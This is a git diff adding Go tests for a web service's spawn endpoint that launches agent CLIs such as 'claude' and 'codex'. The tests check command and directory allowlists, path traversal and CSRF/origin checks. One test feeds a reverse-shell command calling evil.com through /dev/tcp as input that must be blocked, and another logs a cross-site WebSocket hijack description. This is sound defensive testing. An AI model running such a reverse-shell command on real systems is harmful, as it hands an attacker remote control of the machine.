@@ -15,6 +15,11 @@ func init() {
 	// Initialize for tests
 	csrfToken = "test-csrf-token-12345"
 	tailscaleIP = "100.100.100.100"
+	// Enable spawn with test allowlists
+	config = &Config{
+		AllowedCommands:    []string{"claude", "codex", "echo"},
+		AllowedDirectories: []string{"/tmp", "/Users/elle/code"},
+	}
 }
 
 // =============================================================================
@@ -688,6 +693,220 @@ func TestAttack_WebSocketHijackDocumentation(t *testing.T) {
 	t.Log("Attack: evil.com JS does new WebSocket('ws://100.x.x.x:7700/ws')")
 	t.Log("Protection: ttyd rejects if Origin header doesn't match server host")
 	t.Log("Verify: ps aux | grep ttyd | grep -- '-O'")
+}
+
+// =============================================================================
+// ALLOWLIST TESTS
+// These verify that command and directory restrictions work.
+// =============================================================================
+
+func TestAllowlist_CommandNotAllowed(t *testing.T) {
+	form := url.Values{}
+	form.Set("csrf", csrfToken)
+	form.Set("dir", "/tmp")
+	form.Set("cmd", "bash") // Not in allowlist
+
+	req := httptest.NewRequest("POST", "/spawn", strings.NewReader(form.Encode()))
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	req.Header.Set("Origin", "http://"+tailscaleIP)
+
+	w := httptest.NewRecorder()
+	handleSpawn(w, req)
+
+	if w.Code != http.StatusForbidden {
+		t.Errorf("disallowed command 'bash': expected 403, got %d", w.Code)
+	}
+	if !strings.Contains(w.Body.String(), "not allowed") {
+		t.Errorf("expected 'not allowed' in response, got: %s", w.Body.String())
+	}
+}
+
+func TestAllowlist_CommandAllowed(t *testing.T) {
+	form := url.Values{}
+	form.Set("csrf", csrfToken)
+	form.Set("dir", "/tmp")
+	form.Set("cmd", "claude") // In allowlist
+
+	req := httptest.NewRequest("POST", "/spawn", strings.NewReader(form.Encode()))
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	req.Header.Set("Origin", "http://"+tailscaleIP)
+
+	w := httptest.NewRecorder()
+	handleSpawn(w, req)
+
+	// Should not be rejected for command (might fail for other reasons like tmux)
+	if w.Code == http.StatusForbidden && strings.Contains(w.Body.String(), "command") {
+		t.Errorf("allowed command 'claude' was rejected: %s", w.Body.String())
+	}
+}
+
+func TestAllowlist_DirectoryNotAllowed(t *testing.T) {
+	form := url.Values{}
+	form.Set("csrf", csrfToken)
+	form.Set("dir", "/etc") // Not in allowlist
+	form.Set("cmd", "claude")
+
+	req := httptest.NewRequest("POST", "/spawn", strings.NewReader(form.Encode()))
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	req.Header.Set("Origin", "http://"+tailscaleIP)
+
+	w := httptest.NewRecorder()
+	handleSpawn(w, req)
+
+	if w.Code != http.StatusForbidden {
+		t.Errorf("disallowed directory '/etc': expected 403, got %d", w.Code)
+	}
+	if !strings.Contains(w.Body.String(), "not allowed") {
+		t.Errorf("expected 'not allowed' in response, got: %s", w.Body.String())
+	}
+}
+
+func TestAllowlist_DirectoryAllowed(t *testing.T) {
+	form := url.Values{}
+	form.Set("csrf", csrfToken)
+	form.Set("dir", "/tmp") // In allowlist
+	form.Set("cmd", "echo")
+
+	req := httptest.NewRequest("POST", "/spawn", strings.NewReader(form.Encode()))
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	req.Header.Set("Origin", "http://"+tailscaleIP)
+
+	w := httptest.NewRecorder()
+	handleSpawn(w, req)
+
+	// Should not be rejected for directory
+	if w.Code == http.StatusForbidden && strings.Contains(w.Body.String(), "directory") {
+		t.Errorf("allowed directory '/tmp' was rejected: %s", w.Body.String())
+	}
+}
+
+func TestAllowlist_SubdirectoryAllowed(t *testing.T) {
+	form := url.Values{}
+	form.Set("csrf", csrfToken)
+	form.Set("dir", "/Users/elle/code/agent-phone") // Subdirectory of allowed
+	form.Set("cmd", "echo")
+
+	req := httptest.NewRequest("POST", "/spawn", strings.NewReader(form.Encode()))
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	req.Header.Set("Origin", "http://"+tailscaleIP)
+
+	w := httptest.NewRecorder()
+	handleSpawn(w, req)
+
+	// Should not be rejected for directory
+	if w.Code == http.StatusForbidden && strings.Contains(w.Body.String(), "directory") {
+		t.Errorf("subdirectory of allowed was rejected: %s", w.Body.String())
+	}
+}
+
+func TestAllowlist_TraversalBlocked(t *testing.T) {
+	// Try to escape allowed directory via ../
+	form := url.Values{}
+	form.Set("csrf", csrfToken)
+	form.Set("dir", "/tmp/../etc") // Tries to escape to /etc
+	form.Set("cmd", "claude")
+
+	req := httptest.NewRequest("POST", "/spawn", strings.NewReader(form.Encode()))
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	req.Header.Set("Origin", "http://"+tailscaleIP)
+
+	w := httptest.NewRecorder()
+	handleSpawn(w, req)
+
+	if w.Code != http.StatusForbidden {
+		t.Errorf("directory traversal should be blocked: got %d", w.Code)
+	}
+}
+
+func TestAllowlist_ReverseShellBlocked(t *testing.T) {
+	// Even with valid origin and CSRF, malicious command is blocked
+	form := url.Values{}
+	form.Set("csrf", csrfToken)
+	form.Set("dir", "/tmp")
+	form.Set("cmd", "bash -c 'bash -i >& /dev/tcp/evil.com/4444 0>&1'")
+
+	req := httptest.NewRequest("POST", "/spawn", strings.NewReader(form.Encode()))
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	req.Header.Set("Origin", "http://"+tailscaleIP)
+
+	w := httptest.NewRecorder()
+	handleSpawn(w, req)
+
+	if w.Code != http.StatusForbidden {
+		t.Errorf("reverse shell command should be blocked: got %d", w.Code)
+	}
+}
+
+func TestAllowlist_SpawnDisabledWithoutConfig(t *testing.T) {
+	// Temporarily disable config
+	savedConfig := config
+	config = nil
+	defer func() { config = savedConfig }()
+
+	form := url.Values{}
+	form.Set("csrf", csrfToken)
+	form.Set("dir", "/tmp")
+	form.Set("cmd", "claude")
+
+	req := httptest.NewRequest("POST", "/spawn", strings.NewReader(form.Encode()))
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	req.Header.Set("Origin", "http://"+tailscaleIP)
+
+	w := httptest.NewRecorder()
+	handleSpawn(w, req)
+
+	if w.Code != http.StatusForbidden {
+		t.Errorf("spawn without config should be blocked: got %d", w.Code)
+	}
+	if !strings.Contains(w.Body.String(), "spawn disabled") {
+		t.Errorf("expected 'spawn disabled' message, got: %s", w.Body.String())
+	}
+}
+
+func TestIsCommandAllowed(t *testing.T) {
+	tests := []struct {
+		cmd      string
+		expected bool
+	}{
+		{"claude", true},
+		{"codex", true},
+		{"echo", true},
+		{"bash", false},
+		{"sh", false},
+		{"rm", false},
+		{"curl", false},
+		{"", false},
+	}
+
+	for _, tc := range tests {
+		result := isCommandAllowed(tc.cmd)
+		if result != tc.expected {
+			t.Errorf("isCommandAllowed(%q) = %v, want %v", tc.cmd, result, tc.expected)
+		}
+	}
+}
+
+func TestIsDirectoryAllowed(t *testing.T) {
+	tests := []struct {
+		dir      string
+		expected bool
+	}{
+		{"/tmp", true},
+		{"/tmp/subdir", true},
+		{"/Users/elle/code", true},
+		{"/Users/elle/code/project", true},
+		{"/etc", false},
+		{"/", false},
+		{"/Users/elle", false},
+		{"/tmp/../etc", false}, // traversal
+	}
+
+	for _, tc := range tests {
+		result := isDirectoryAllowed(tc.dir)
+		if result != tc.expected {
+			t.Errorf("isDirectoryAllowed(%q) = %v, want %v", tc.dir, result, tc.expected)
+		}
+	}
 }
 
 // =============================================================================
